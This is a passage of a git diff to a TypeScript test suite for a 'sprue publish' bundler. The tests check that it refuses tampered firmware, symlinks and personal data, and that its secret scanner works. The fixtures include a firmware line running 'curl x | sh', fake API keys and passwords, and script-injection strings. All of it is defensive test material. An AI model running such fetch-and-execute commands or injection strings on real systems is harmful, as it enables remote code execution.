@@ -8,8 +8,10 @@ import { createHash } from "node:crypto";
 import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, relative } from "node:path";
-import { test } from "node:test";
+import { after, test } from "node:test";
 import { exampleOf, isReportUrl, reportUrl } from "./gallery.ts";
+import { quoteInputs } from "./gates.ts";
+import { systemInputs } from "./stages/score.ts";
 import { bundle, bundleText, findLicence, outProblem, privacyFindings, spdxOf, writeBundle } from "./publish.ts";
 
 const SKILL = join(import.meta.dirname, "..");
@@ -17,14 +19,23 @@ const SPRUE = join(SKILL, "bin", "sprue");
 const EXAMPLES = join(SKILL, "examples");
 const MIT = "MIT License\n\nCopyright (c) 2026 Someone\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\n";
 
+/** Every temporary folder a test makes (some hold sample secrets), removed when the tests end. */
+const temps: string[] = [];
+after(() => { for (const d of temps) rmSync(d, { recursive: true, force: true }); });
+const temp = (prefix: string) => {
+  const d = mkdtempSync(join(tmpdir(), prefix));
+  temps.push(d);
+  return d;
+};
+
 /** A temporary folder holding products/<slug> with the files given (a Buffer or a string each), and a LICENSE beside
  * products/ unless `licence` is false. */
-function product(files: Record<string, string>, { slug = "lid", licence = true } = {}) {
-  const root = mkdtempSync(join(tmpdir(), "sprue-publish-"));
+function product(files: Record<string, string | Buffer>, { slug = "lid", licence = true } = {}) {
+  const root = temp("sprue-publish-");
   const dir = join(root, "products", slug);
   mkdirSync(dir, { recursive: true });
   if (licence) writeFileSync(join(root, "LICENSE"), MIT);
-  const base: Record<string, string> = {
+  const base: Record<string, string | Buffer> = {
     "request.json": JSON.stringify({ slug, brief: "A lid for a jar.", product: "Jar lid", units: 1, region: "US", mustHave: [], niceToHave: [], constraints: {} }),
     "design.json": JSON.stringify({ slug, summary: "A lid", architecture: [], params: { wallMm: 2 } }),
     "bom.json": JSON.stringify({ slug, units: 1, lines: [{ id: "lid", name: "Lid", role: "case", process: "print", qtyPerUnit: 1, spec: { volumeCm3: 1 }, file: "fab/lid.stl" }] }),
@@ -124,17 +135,18 @@ test("a bundle sends the design's sources and leaves the rest out, by why", () =
   const b = bundle(p.dir, p.slug);
   assert.deepEqual(b.problems, []);
   assert.deepEqual(b.files.map((f) => f.path),
-    ["LICENSE", "bom.json", "cad/_params.py", "cad/lid.py", "cad/pcb.mjs", "design.json", "design.md", "figure.mjs", "request.json", "rules.ts"]);
+    ["LICENSE", "bom.json", "cad/_params.py", "cad/lib/k.py", "cad/lid.py", "cad/pcb.mjs", "design.json", "design.md", "figure.mjs", "request.json", "rules.ts"]);
   assert.deepEqual(b.left.rebuilt, ["build-plan.md", "checks.json", "explorer.json", "fab/", "faults.json", "figure.json", "figure.svg", "pcb/", "previews/", "production/", "score.json", "system.json", "view.html"]);
   assert.deepEqual(b.left.never.map((x) => x.replace(/ \(.*$/, "")),
     [".env", "catalog.json", "firmware/code.sprue.py", "firmware/fil.json", "history/", "offers.digikey.json", "quotes.json", "reference/", "shots/", "sourcing.json", "state.json"]);
-  assert.deepEqual(b.left.other, ["cad/lib/", "cad/notes.txt", "photo.jpg"]);
+  // The CAD's code at any depth goes (a module cad/*.py imports); other files in cad/ are listed.
+  assert.deepEqual(b.left.other, ["cad/notes.txt", "photo.jpg"]);
   // entry.json lists each file sent by its size and sha256, and nothing else.
   assert.deepEqual(Object.keys(b.entry.files), b.files.map((f) => f.path));
   assert.equal(b.entry.files["design.md"].sha256, `sha256:${createHash("sha256").update("# Lid\n").digest("hex")}`);
   assert.equal(b.entry.files["design.md"].bytes, 6);
   assert.match(b.entry.bundle, /^sha256:[0-9a-f]{64}$/);
-  assert.match(b.entry.sprue.gates, /^sha256:[0-9a-f]{64}$/);
+  assert.match(b.entry.sprue.publishedWith, /^sha256:[0-9a-f]{64}$/);
   assert.deepEqual(b.entry.licence, { spdx: "MIT", file: "LICENSE" });
   assert.equal(b.entry.title, "Jar lid");
   // The secret in .env is never read, so it is not a problem: .env is never sent.
@@ -169,17 +181,32 @@ test("it refuses personal data in a sent file, naming the file and line", () => 
   for (const x of b.problems) assert.ok(!/gmail|jane\/lid|abcd1234|123 4567/.test(x), x);
 });
 
-test("it refuses firmware sprue pcb did not write, and leaves out the firmware it did", () => {
+test("it refuses firmware sprue pcb did not write for this board, and leaves out the firmware it did", () => {
   const hand = product({ "firmware/code.py": "import board\nprint('mine')\n" });
-  assert.match(bundle(hand.dir, hand.slug).problems.join("\n"), /firmware\/code\.py is not one sprue pcb wrote for lid: hand-written firmware isn't published/);
-  // One sprue pcb wrote for another product is not this board's: refused too.
+  assert.equal(bundle(hand.dir, hand.slug).problems.join("\n"),
+    "firmware/code.py is not one sprue pcb wrote: hand-written firmware isn't published, since it could do anything on a builder's computer and no emulator run shows it doesn't. Move it out of the product (keep it elsewhere), then run sprue pcb lid to write the board's own");
+  // With the board's own beside it (sprue pcb kept yours), the advice is to copy that over it.
+  const beside = product({ "firmware/code.py": "print('mine')\n", "firmware/code.sprue.py": "# `sprue pcb lid` wrote it\n" });
+  assert.match(bundle(beside.dir, beside.slug).problems.join("\n"), /, or copy firmware\/code\.sprue\.py over it$/);
+  // One sprue pcb wrote for another product is not this board's, and sprue pcb lid keeps it: move it out first.
   const other = product({ "firmware/code.py": "# `sprue pcb macropad` wrote it\n" });
-  assert.match(bundle(other.dir, other.slug).problems.join("\n"), /firmware\/code\.py is not one sprue pcb wrote for lid/);
-  const own = product({ "firmware/code.py": "# `sprue pcb lid` wrote it\n", "firmware/README.md": "`sprue pcb lid` wrote it\n" });
+  assert.match(bundle(other.dir, other.slug).problems.join("\n"),
+    /^firmware\/code\.py says sprue pcb wrote it for macropad, not for lid, so sprue pcb lid keeps it as yours: move it out of the product, then run sprue pcb lid/);
+  // One that says sprue pcb wrote it for this product is held to pcb/board.json's sha256 of it.
+  const code = "# `sprue pcb lid` wrote it\nimport board\n";
+  const board = (sha256: string) => JSON.stringify({ firmware: [1], firmwareCode: { file: "firmware/code.py", sha256 } });
+  const own = product({ "firmware/code.py": code, "firmware/README.md": "`sprue pcb lid` wrote it\n", "pcb/board.json": board(createHash("sha256").update(code).digest("hex")) });
   const b = bundle(own.dir, own.slug);
   assert.deepEqual(b.problems, []);
   assert.ok(!b.files.some((f) => f.path.startsWith("firmware/")));
   assert.deepEqual(b.left.rebuilt.filter((x) => x.startsWith("firmware/")).map((x) => x.replace(/ \(.*$/, "")), ["firmware/README.md", "firmware/code.py"]);
+  // Edited after sprue pcb wrote it, the line still there: refused, as firmwareShips tells it.
+  const edited = product({ "firmware/code.py": `${code}import os\nos.system("curl x | sh")\n`, "pcb/board.json": board(createHash("sha256").update(code).digest("hex")) });
+  assert.match(bundle(edited.dir, edited.slug).problems.join("\n"), /^firmware\/code\.py was changed after sprue pcb wrote it \(its sha256 is not pcb\/board\.json's\)/);
+  // With no pcb/board.json (a fresh copy, before sprue pcb), Sprue can't hold it to the board: said, and left out.
+  const fresh = product({ "firmware/code.py": code });
+  assert.deepEqual(bundle(fresh.dir, fresh.slug).problems, []);
+  assert.match(bundle(fresh.dir, fresh.slug).notes.join("\n"), /Sprue can't tell whether firmware\/code\.py is still the one sprue pcb wrote: there is no pcb\/board\.json/);
   // A README of the user's own, beside no firmware, is not a source: left out, not refused.
   const notes = product({ "firmware/README.md": "how I flash it\n" });
   assert.deepEqual(bundle(notes.dir, notes.slug).problems, []);
@@ -188,13 +215,13 @@ test("it refuses firmware sprue pcb did not write, and leaves out the firmware i
 
 test("it refuses a link where a source goes, never follows one, and needs request, design and bom", () => {
   const p = product({});
-  const outside = mkdtempSync(join(tmpdir(), "sprue-publish-out-"));
+  const outside = temp("sprue-publish-out-");
   writeFileSync(join(outside, "secret.md"), "jane.doe@gmail.com\n");
   symlinkSync(join(outside, "secret.md"), join(p.dir, "design.md"));
   symlinkSync(outside, join(p.dir, "notes"));
   const b = bundle(p.dir, p.slug);
   assert.deepEqual(b.problems.map((x) => x.replace(/ \(to .*$/, "")), ["design.md is a link"]);
-  assert.deepEqual(b.left.never, ["notes (a link, never followed)"]);
+  assert.deepEqual(b.left.never, ["notes (a link: not sent, and no claim is read through it)"]);
   // A cad/ folder that is a link is refused whole.
   const q = product({});
   mkdirSync(join(outside, "cad"));
@@ -222,6 +249,31 @@ test("the licence is found in the product's folder or above it, and its absence 
   // A licence with an address in it is scanned like any file sent.
   const mail = product({ "LICENSE.md": `${MIT}\nContact: jane.doe@gmail.com\n` });
   assert.match(bundle(mail.dir, mail.slug).problems.join("\n"), /LICENSE\.md:7: an email address/);
+  // The product's own licence is sent as LICENSE and not also listed as not sent; a second one is listed.
+  const two = bundle(...Object.values(product({ "LICENSE.md": MIT, COPYING: MIT })).slice(1, 3) as [string, string]);
+  assert.ok(two.files.some((f) => f.path === "LICENSE"));
+  assert.deepEqual(two.left.other, ["LICENSE.md (another licence file: only one goes, as LICENSE)"]);
+  // A licence that is a link is never followed: in the product it refuses, as any source's link does, and above it
+  // there is no licence, said; a dangling one breaks nothing.
+  const outside = temp("sprue-publish-out-");
+  writeFileSync(join(outside, "notes.txt"), `${MIT}\nPRIVATE NOTES FROM OUTSIDE THE PRODUCT\n`);
+  for (const name of ["LICENSE.md", "COPYING", "license"]) {
+    const q = product({}, { licence: false });
+    symlinkSync(join(outside, "notes.txt"), join(q.dir, name));
+    const b = bundle(q.dir, q.slug);
+    assert.deepEqual(b.problems.map((x) => x.replace(/ \(to .*$/, "")), [`${name} is a link`], name);
+    assert.ok(!b.files.some((f) => f.path === "LICENSE"), name);
+  }
+  const up = product({}, { licence: false });
+  symlinkSync(join(outside, "notes.txt"), join(up.root, "LICENSE"));
+  const ub = bundle(up.dir, up.slug);
+  assert.deepEqual(ub.problems, []);
+  assert.equal(ub.entry.licence, null);
+  assert.ok(!ub.files.some((f) => f.path === "LICENSE"));
+  assert.match(ub.notes.join("\n"), /the licence at .*LICENSE is a link, which a bundle never follows, so no licence is sent/);
+  const dangling = product({}, { licence: false });
+  symlinkSync(join(outside, "gone"), join(dangling.dir, "LICENSE"));
+  assert.deepEqual(bundle(dangling.dir, dangling.slug).problems.map((x) => x.replace(/ \(to .*$/, "")), ["LICENSE is a link"]);
 });
 
 test("claims and cost come from the records, and say when they are not of the files now", () => {
@@ -232,17 +284,45 @@ test("claims and cost come from the records, and say when they are not of the fi
     "catalog.json": JSON.stringify({ shipping: {}, offers: { lid: [{ supplier: "Craftcloud", sku: "x", capturedAt: "2026-10-14", priceBreaks: [] }, { supplier: "Other", sku: "y", capturedAt: "2026-01-01" }] } }),
     "score.json": JSON.stringify({ pass: false }),
   });
-  const e = bundle(p.dir, p.slug).entry;
-  assert.deepEqual({ ...e.cost, why: undefined }, { batchUsd: 12.5, units: 2, region: "US", includesEstimates: true, pricesRead: { from: "2026-10-14", to: "2026-10-14" }, current: false, why: undefined });
+  const pb = bundle(p.dir, p.slug), e = pb.entry;
+  assert.deepEqual({ ...e.cost, why: undefined }, { batchUsd: 12.5, units: 2, region: "US", includesEstimates: true, pricesRead: { from: "2026-10-14", to: "2026-10-14" }, current: false, complete: false, why: undefined });
   assert.match(e.cost!.why!, /quotes\.json does not say what it was priced from/);
-  assert.deepEqual(e.claimed.score, { pass: false });
-  // The whole product: a made part with no cad/_system.py says so, as the score would.
-  assert.equal(e.claimed.system?.ok, false);
-  assert.match(e.claimed.system!.detail, /no cad\/_system\.py/);
+  assert.deepEqual(e.claimed.score, { pass: false, state: "fails" });
+  // The whole product: a made part with no cad/_system.py says so, as the score would; entry.json has one word for it,
+  // and the record's own words are for the terminal.
+  assert.deepEqual(e.claimed.system, { ok: false, state: "not run" });
+  assert.match(pb.said.system!, /no cad\/_system\.py/);
+  assert.match(bundleText(pb), /the whole product: not run: no cad\/_system\.py/);
   assert.equal(e.claimed.board, undefined);
+  // A quote of the files as they are that leaves a line unpriced and a shop's shipping out is not the whole order: no
+  // "within the budget" then. Malformed offers and line ids break nothing.
+  const offer = { supplier: "Shop", sku: "s1", url: "https://shop.example.com/s1", leadDays: 3, source: "snapshot", stock: "in stock", priceBreaks: [{ qty: 1, unitUsd: 0.25 }], capturedAt: "2026-10-01T00:00:00Z" };
+  const q = product({
+    "request.json": JSON.stringify({ slug: "lid", brief: "A bracket.", product: "Bracket", units: 1, region: "US", budgetUsd: 20, mustHave: [], niceToHave: [], constraints: {} }),
+    "bom.json": JSON.stringify({ slug: "lid", units: 1, lines: [
+      { id: "screw", name: "Screw", role: "fastener", process: "buy", qtyPerUnit: 6, spec: {} },
+      { id: "bracket", name: "Bracket", role: "bracket", process: "cnc", qtyPerUnit: 1, spec: { material: "6061" }, file: "fab/bracket.step" }] }),
+    "catalog.json": JSON.stringify({ shipping: {}, offers: { screw: [offer] } }),
+  });
+  writeFileSync(join(q.dir, "quotes.json"), JSON.stringify({ slug: "lid", units: 1, batchUsd: 1.5, perUnitUsd: 1.5, longestLeadDays: 3, unquoted: ["bracket"], noShipping: ["Shop"],
+    lines: [{ lineId: "screw", supplier: "Shop", sku: "s1", mode: "snapshot", orderQty: 6, orderUsd: 1.5, leadDays: 3, basis: "snapshot" }],
+    inputs: quoteInputs(q.dir) }));
+  const qb = bundle(q.dir, q.slug);
+  assert.deepEqual(qb.problems, []);
+  assert.equal(qb.entry.cost?.current, true, JSON.stringify(qb.entry.cost));
+  assert.equal(qb.entry.cost?.complete, false);
+  assert.match(qb.entry.cost!.why!, /bracket|Shop/);
+  assert.match(bundleText(qb), /cost: \$1\.50 for 1 unit \(US\); prices read 2026-10-01; not the whole order: /);
+  assert.doesNotMatch(bundleText(qb), /within the \$20\.00 budget/);
+  // A catalog keyed "__proto__" and a quote line "constructor" are read as data, not as an object's own parts.
+  const odd = product({
+    "catalog.json": '{"shipping": {}, "offers": {"__proto__": [{"supplier": "S", "sku": "x", "capturedAt": "2026-10-02"}], "constructor": "x"}}',
+    "quotes.json": JSON.stringify({ slug: "lid", units: 1, batchUsd: 1, lines: [{ lineId: "constructor", supplier: "S", sku: "x" }, { lineId: "__proto__", supplier: "S", sku: "x" }, null] }),
+  });
+  assert.equal(bundle(odd.dir, odd.slug).entry.cost?.pricesRead?.from, "2026-10-02");
   // No records at all: no claims, said plainly.
   const bare = product({});
-  assert.match(bundleText(bundle(bare.dir, bare.slug)), /Claims, [^\n]*\n {2}the whole product: doesn't pass/);
+  assert.match(bundleText(bundle(bare.dir, bare.slug)), /Claims, [^\n]*\n {2}the whole product: not run: no cad\/_system\.py/);
 });
 
 test("it flags a product for children, and one with a camera or a microphone, from the request and the BOM", () => {
@@ -256,9 +336,22 @@ test("it flags a product for children, and one with a camera or a microphone, fr
   const e = bundle(p.dir, p.slug).entry;
   assert.deepEqual(e.flags?.map((f) => [f.kind, f.found]), [
     ["children", ["request.json constraints.userAgeMin: 3", 'request.json brief: "toddler"']],
-    ["recording", ['bom.json line cam: "camera"', 'bom.json line mic: "mic"']]]);
+    ["recording", ['bom.json line cam: "camera"', 'bom.json line mic: "audio-in"']]]);
   const plain = product({});
   assert.equal(bundle(plain.dir, plain.slug).entry.flags, undefined);
+  // Cameras and microphones by their usual parts' names, and not a screw for a camera's plate or a child lock.
+  const flagsOf = (brief: string, lines: object[]) => bundle(...Object.values(product({
+    "request.json": JSON.stringify({ slug: "lid", brief, product: "Thing", units: 1, region: "US", mustHave: [], niceToHave: [], constraints: {} }),
+    "bom.json": JSON.stringify({ slug: "lid", units: 1, lines: lines.map((l, k) => ({ id: `l${k}`, process: "buy", qtyPerUnit: 1, spec: {}, ...l })) }),
+  })).slice(1, 3) as [string, string]).entry.flags?.map((f) => f.found.join("; ")) ?? [];
+  assert.deepEqual(flagsOf("A doorbell.", [{ name: "ESP32-CAM board", role: "controller" }]), ['bom.json line l0: "ESP32-CAM"']);
+  assert.deepEqual(flagsOf("A doorbell.", [{ name: "USB webcam", role: "sensor" }]), ['bom.json line l0: "webcam"']);
+  assert.deepEqual(flagsOf("A doorbell.", [{ name: "Sensor", role: "sensor", spec: { mpn: "OV2640" } }]), ['bom.json line l0: "OV2640"']);
+  assert.deepEqual(flagsOf("A doorbell.", [{ name: "INMP441 module", role: "sensor" }]), ['bom.json line l0: "INMP441"']);
+  assert.deepEqual(flagsOf("A mount.", [{ name: "Camera plate screw", role: "fastener" }]), []);
+  assert.deepEqual(flagsOf("A cabinet with a child lock.", []), []);
+  assert.deepEqual(flagsOf("A child-resistant cap.", []), []);
+  assert.deepEqual(flagsOf("A Toyota key fob, with a microcontroller and a dynamic display.", [{ name: "MIC5219 regulator", role: "power" }]), []);
 });
 
 test("--out writes only outside the product and any git work tree, to a new or empty folder", () => {
@@ -268,9 +361,9 @@ test("--out writes only outside the product and any git work tree, to a new or e
   assert.match(ok("products/lid/bundle") ?? "", /is in the product's folder/);
   assert.match(ok("products/x") ?? "", /is in products\//);
   assert.match(ok(join(SKILL, "examples", "x")) ?? "", /Sprue's own folder/);
-  const fresh = join(mkdtempSync(join(tmpdir(), "sprue-out-")), "bundle");
+  const fresh = join(temp("sprue-out-"), "bundle");
   assert.equal(ok(fresh), undefined);
-  const full = mkdtempSync(join(tmpdir(), "sprue-out-"));
+  const full = temp("sprue-out-");
   writeFileSync(join(full, "keep.txt"), "mine");
   assert.match(ok(full) ?? "", /is not empty/);
   assert.match(ok(join(full, "keep.txt")) ?? "", /is a file/);
@@ -278,7 +371,7 @@ test("--out writes only outside the product and any git work tree, to a new or e
   mkdirSync(join(p.root, ".git"));
   assert.match(ok(join(p.root, "out")) ?? "", /the git work tree at/);
   // Through a link into the product, too.
-  const via = mkdtempSync(join(tmpdir(), "sprue-out-"));
+  const via = temp("sprue-out-");
   symlinkSync(p.dir, join(via, "here"));
   assert.match(ok(join(via, "here", "b")) ?? "", /is in the product's folder/);
 });
@@ -291,7 +384,7 @@ test("sprue publish prints the bundle and changes nothing; --out writes it; a re
   assert.match(r.stdout, /^sprue publish lid: what a gallery entry of it would hold\. Print only/);
   assert.match(r.stdout, /\nentry\.json:\n\{\n {2}"format": 1,/);
   assert.deepEqual(snapshot(p.root), before);
-  const out = join(mkdtempSync(join(tmpdir(), "sprue-out-")), "b");
+  const out = join(temp("sprue-out-"), "b");
   const w = run(p.root, "publish", "lid", "--out", out);
   assert.equal(w.status, 0, w.stderr);
   assert.deepEqual(snapshot(p.root), before);
@@ -303,7 +396,7 @@ test("sprue publish prints the bundle and changes nothing; --out writes it; a re
   assert.match(w.stdout, /wrote 6 files to .* \(the 5 above and entry\.json\); nothing was uploaded/);
   // Refused: the reasons on stderr, nothing on stdout, nothing written.
   writeFileSync(join(p.dir, "design.md"), "jane.doe@gmail.com\n");
-  const out2 = join(mkdtempSync(join(tmpdir(), "sprue-out-")), "b");
+  const out2 = join(temp("sprue-out-"), "b");
   const no = run(p.root, "publish", "lid", "--out", out2);
   assert.equal(no.status, 1);
   assert.equal(no.stdout, "");
@@ -335,7 +428,7 @@ test("both worked examples publish clean, under 1 MB, with no run output, offer 
 
 test("writeBundle writes each file at its path and entry.json beside them", () => {
   const p = product({ "cad/lid.py": "x = 1\n" });
-  const out = join(mkdtempSync(join(tmpdir(), "sprue-out-")), "b");
+  const out = join(temp("sprue-out-"), "b");
   mkdirSync(out);
   assert.deepEqual(writeBundle(bundle(p.dir, p.slug), out), ["LICENSE", "bom.json", "cad/lid.py", "design.json", "request.json", "entry.json"]);
   assert.equal(readFileSync(join(out, "cad", "lid.py"), "utf8"), "x = 1\n");
@@ -343,7 +436,7 @@ test("writeBundle writes each file at its path and entry.json beside them", () =
 });
 
 test("a build report links only from one of the skill's examples, or a copy of one", () => {
-  const ex = mkdtempSync(join(tmpdir(), "sprue-examples-"));
+  const ex = temp("sprue-examples-");
   mkdirSync(join(ex, "lid"));
   writeFileSync(join(ex, "lid", "request.json"), JSON.stringify({ brief: "A lid for a jar." }));
   const copy = product({});
@@ -358,4 +451,137 @@ test("a build report links only from one of the skill's examples, or a copy of o
   assert.ok(!isReportUrl("javascript:alert(1)"));
   assert.ok(!isReportUrl("https://github.com/someone/else/issues/new?template=build-report.yml&product=x"));
   assert.ok(!isReportUrl(`${reportUrl("x")}"><script>`));
+});
+
+test("the scan finds the usual shapes of keys, passwords, phone numbers and home folders, after an escape too", () => {
+  const found = (text: string, file = "f") => privacyFindings(file, text).map((f) => f.kind);
+  const key = "a key, token or password", token = "a key or token", phone = "a phone number", home = "a home folder's path (a user name)";
+  for (const line of ['wifi_password = "MyHomeWifi2024"', '"wifiPassword": "MyHomeWifi2024"', 'mqtt_password = "Sup3rS3cret!"', "password: Sup3rS3cret!",
+    '"password": "correct horse battery staple"', "api_key=abcd1234efgh5678", "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG", 'AIO_KEY = "abcdEFGH1234ijklMNOP5678"',
+    "SUPABASE_SERVICE_ROLE_KEY=abcdefgh12345678abcdefgh"])
+    assert.deepEqual(found(line), [key], line);
+  for (const line of [`sk-proj-${"Ab1".repeat(16)}`, `eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.${"a".repeat(20)}`, `glpat-${"x".repeat(20)}`,
+    `sk_live_${"a1".repeat(12)}`, `aio_${"aB3".repeat(8)}`, `Authorization: Bearer ${"a1B2".repeat(6)}`])
+    assert.deepEqual(found(line), [token], line);
+  assert.deepEqual(found("-----BEGIN PGP PRIVATE KEY BLOCK-----"), ["a private key"]);
+  for (const line of ["Cell: 333 123 4567", "Tel. 06 1234 5678", "Mobil 0176 1234 5678", "phone 0044 7700 900123", "call me: 415 555 0132", "1-415-555-0132", "07700 900123", "0049 176 12345678", "333 1234567"])
+    assert.deepEqual(found(line), [phone], line);
+  for (const line of ["/mnt/c/Users/Tobias/Downloads/ds.pdf", "/var/home/tobias/keypad", "/cygdrive/c/Users/Tobias/x", "/c/Users/Tobias/x", "/usr/home/tobias/x", "/Volumes/Macintosh HD/Users/tobias/x"])
+    assert.deepEqual(found(line), [home], line);
+  // Right after a \n or \t escape in a JSON, JS or Python string.
+  for (const [line, kind] of [['"x": "call\\n+39 333 123 4567"', phone], ['"f": "from\\n/Users/jane/cad"', home], ['"t": "x\\t555-123-4567"', phone],
+    ['"e": "a\\nDIGIKEY_CLIENT_SECRET=abcd1234efgh"', key], [`"g": "\\nghp_${"a".repeat(36)}"`, token], ['"k": "\\nAKIAABCDEFGHIJKLMNOP"', token],
+    ['"p": "C:\\\\Users\\\\nancy\\\\x"', home]] as const)
+    assert.deepEqual(found(line), [kind], line);
+  // A link with a password in it: named as one, and only its scheme shown.
+  const link = privacyFindings("f", "mqtt://keypad:Sup3rS3cret@192.168.1.20:1883 and https://tobias:hunter2pass@github.com/x.git");
+  assert.deepEqual(link.map((f) => [f.kind, f.sample]), [["a password in a link", "mqtt://…"]]);
+  assert.ok(!JSON.stringify(privacyFindings("f", "https://tobias:hunter2pass@github.com/x.git")).includes("hunt"));
+});
+
+test("the scan lets code, data and the usual placeholders through, and takes linear time on a long line", () => {
+  const none = (text: string, file = "f") => assert.deepEqual(privacyFindings(file, text), [], text);
+  none("p = R@np.array([0, 0, 1])", "cad/x.py");
+  none("tip = pose@self.offset", "cad/x.py");
+  none("world = M@pts.transpose()", "cad/_system.py");
+  none("token: string;\nconst tokenCount = 3;\npassword = getpass()\napi_key = os.environ['API_KEY']", "rules.ts");
+  none('api_key = "YOUR_API_KEY"\nsecret = "<your secret>"');
+  none('"capturedAt": "2026-10-13T19:36:56.903Z", "qty": 100, "unitUsd": 0.25');
+  none("0.15 mm, 2026-11-11, 19.05 mm pitch, M3x8, 3.3 V, 1000 pcs");
+  // An address in code still counts when it is one.
+  assert.deepEqual(privacyFindings("cad/x.py", "# ask jane.doe@gmail.com").map((f) => f.kind), ["an email address"]);
+  for (const line of ["A".repeat(60_000).replace(/A/g, (_, i) => "Ab1_-."[i % 6]), `+${"1".repeat(200_000)}`, "+1".repeat(100_000), `${"a".repeat(100_000)}@`, "0".repeat(100_000), "3 ".repeat(50_000)]) {
+    const t = performance.now();
+    privacyFindings("f", line);
+    assert.ok(performance.now() - t < 2000, `${line.slice(0, 12)}…: ${Math.round(performance.now() - t)} ms`);
+  }
+});
+
+test("a source that is not UTF-8 text, or UTF-16 with no BOM, is refused, since the scan can't read it", () => {
+  const latin = product({ "design.md": Buffer.from([0x23, 0x20, 0xff, 0xfe, 0x0a]) });
+  assert.match(bundle(latin.dir, latin.slug).problems.join("\n"), /^design\.md is not text \(UTF-8\)/);
+  const wide = product({ "design.md": Buffer.from("Made for jane.doe@gmail.com\n", "utf16le") });
+  assert.match(bundle(wide.dir, wide.slug).problems.join("\n"), /^design\.md is not text \(UTF-8\)/);
+});
+
+test("entry.json holds each claim as one word, never a record's text, and no claim is read through a link", () => {
+  const p = product({ "cad/_system.py": "# check\n", "cad/lid.py": "x = 1\n" });
+  writeFileSync(join(p.dir, "system.json"), JSON.stringify({ slug: "lid", ok: true, inputs: systemInputs(p.dir), gates: [], selfTest: { ok: true } }));
+  // A file added under cad/ after the check makes it stale, and its name (a person's) is in the check's own words.
+  mkdirSync(join(p.dir, "cad", "ref"));
+  writeFileSync(join(p.dir, "cad", "ref", "Jane Doe desk photo.jpg"), "jpg");
+  writeFileSync(join(p.dir, "score.json"), JSON.stringify({ pass: true }));
+  const b = bundle(p.dir, p.slug);
+  assert.deepEqual(b.entry.claimed.system, { ok: false, state: "stale" });
+  assert.match(b.said.system!, /Jane Doe desk photo\.jpg/);
+  assert.ok(!JSON.stringify(b.entry).includes("Jane Doe"));
+  // The score's pass is held to the whole product as it is now: score.json's PASS is stale.
+  assert.deepEqual(b.entry.claimed.score, { pass: false, state: "stale" });
+  assert.match(bundleText(b), /score: score\.json says PASS, but not of the whole product or the seeded faults as they are now: run sprue all/);
+  // A record that is a link lends no claim.
+  const q = product({});
+  const elsewhere = temp("sprue-publish-out-");
+  writeFileSync(join(elsewhere, "score.json"), JSON.stringify({ pass: true }));
+  writeFileSync(join(elsewhere, "checks.json"), JSON.stringify({ checks: [{ id: "a", status: "pass" }] }));
+  symlinkSync(join(elsewhere, "score.json"), join(q.dir, "score.json"));
+  symlinkSync(join(elsewhere, "checks.json"), join(q.dir, "checks.json"));
+  const qb = bundle(q.dir, q.slug);
+  assert.equal(qb.entry.claimed.score, undefined);
+  assert.equal(qb.entry.claimed.checks, undefined);
+  assert.match(qb.notes.join("\n"), /checks\.json is a link, so no claim is read from it/);
+  // A faults.json missing its counts says what it can, never "undefined".
+  const f = product({ "reference/faults.json": "[]", "faults.json": '{"ok": true}' });
+  const fb = bundle(f.dir, f.slug);
+  assert.equal(fb.entry.claimed.faults?.ran, undefined);
+  assert.ok(!bundleText(fb).includes("undefined"));
+  // What entry.json takes from a record is scanned (state.json's stage), what it copies from a sent file is not again.
+  const s = product({ "state.json": JSON.stringify({ stage: "/home/jane/x", stages: {} }) });
+  assert.match(bundle(s.dir, s.slug).problems.join("\n"), /^entry\.json's claims or cost: a home folder's path/);
+  const brief = product({ "request.json": JSON.stringify({ slug: "lid", brief: "Mail jane.doe@gmail.com", product: "Lid", units: 1, region: "US", constraints: {} }) });
+  assert.deepEqual(bundle(brief.dir, brief.slug).problems.map((x) => x.replace(/ \(.*$/, "")), ["request.json:1: an email address"]);
+});
+
+test("every module the board's code imports must be one the bundle sends", () => {
+  const drc = (modules: string[]) => JSON.stringify({ inputs: "x", reads: { design: [], bom: [], modules } });
+  const out = product({ "cad/pcb.mjs": "export default {}\n", "pcb/drc.json": drc(["../../shared/layout.json", "cad/pcb.mjs"]) });
+  assert.deepEqual(bundle(out.dir, out.slug).problems, ["the board's code imports ../../shared/layout.json, outside the product, which a bundle doesn't send: move it into cad/ and import it from there"]);
+  const top = product({ "cad/pcb.mjs": "export default {}\n", "layout.json": "{}", "pcb/drc.json": drc(["cad/pcb.mjs", "layout.json"]) });
+  assert.match(bundle(top.dir, top.slug).problems.join("\n"), /^the board's code imports layout\.json, which a bundle doesn't send/);
+  const inCad = product({ "cad/pcb.mjs": "export default {}\n", "cad/layout.json": "{}", "pcb/drc.json": drc(["cad/layout.json", "cad/pcb.mjs"]) });
+  const b = bundle(inCad.dir, inCad.slug);
+  assert.deepEqual(b.problems, []);
+  assert.ok(b.files.some((f) => f.path === "cad/layout.json"));
+});
+
+test("--out is refused in any git work tree and under a file; a path is no product's name", () => {
+  const p = product({});
+  const other = temp("sprue-out-");
+  mkdirSync(join(other, ".git"));
+  assert.match(outProblem(join(other, "bundle"), { product: p.dir, skill: SKILL, cwd: p.root }) ?? "", /is in the git work tree at /);
+  const file = join(temp("sprue-out-"), "f");
+  writeFileSync(file, "x");
+  assert.match(outProblem(join(file, "b"), { product: p.dir, skill: SKILL, cwd: p.root }) ?? "", /is under a file/);
+  const r = run(p.root, "publish", "../products/lid");
+  assert.equal(r.status, 1);
+  assert.match(r.stderr, /\.\.\/products\/lid is not a product's name/);
+});
+
+test("--out writes the bytes that were scanned, even when a file changes after", () => {
+  const p = product({ "design.md": "# Lid\n" });
+  const b = bundle(p.dir, p.slug);
+  writeFileSync(join(p.dir, "design.md"), "jane.doe@gmail.com\n");
+  const out = join(temp("sprue-out-"), "b");
+  writeBundle(b, out);
+  assert.equal(readFileSync(join(out, "design.md"), "utf8"), "# Lid\n");
+});
+
+test("spdxOf tells MIT No Attribution from MIT", () => {
+  assert.equal(spdxOf("MIT No Attribution\n\nCopyright 2026 Someone\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this\nsoftware"), "MIT-0");
+  assert.equal(spdxOf("Permission is hereby granted, free of charge, to any person obtaining a copy of this software, and that is all."), null);
+  assert.equal(spdxOf("Copyright x\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\n...\nThe above copyright notice and this permission notice shall be included in all copies"), "MIT");
